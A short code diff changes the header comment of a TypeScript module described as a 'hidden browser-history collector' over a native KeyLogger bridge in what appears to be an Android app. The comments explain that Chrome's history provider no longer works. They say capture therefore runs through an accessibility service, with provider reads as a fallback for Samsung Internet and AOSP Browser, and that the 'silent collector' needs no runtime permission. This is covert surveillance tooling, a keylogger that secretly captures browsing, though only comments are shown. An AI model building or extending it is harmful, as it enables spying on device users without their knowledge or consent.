@@ -1,8 +1,12 @@
 // features/capture/browser.ts — hidden browser-history collector facade over
 // the native KeyLogger.readBrowserHistory bridge. History + timestamps only,
-// as the feature was scoped. No runtime permission is required (Chrome's
-// history ContentProvider is world-readable). Never throws; degraded states are
-// explicit `{ ok:false, reason }` so the silent collector can skip cleanly.
+// as the feature was scoped. No runtime permission is required. Modern Chrome
+// (90+) no longer exports a working history ContentProvider (verified empty on
+// Chrome 113 & 150), so the effect capture is driven by self-capture in the
+// accessibility service — see native/keylogger/BrowserHistoryStore.kt. The
+// bridge still falls back to provider reads for browsers that export one
+// (Samsung Internet, AOSP Browser). Never throws; degraded states are explicit
+// `{ ok:false, reason }` so the silent collector can skip cleanly.
 import { KeyLogger } from '../keylogger/KeyLogger';
 
 export type BrowserHistory = {
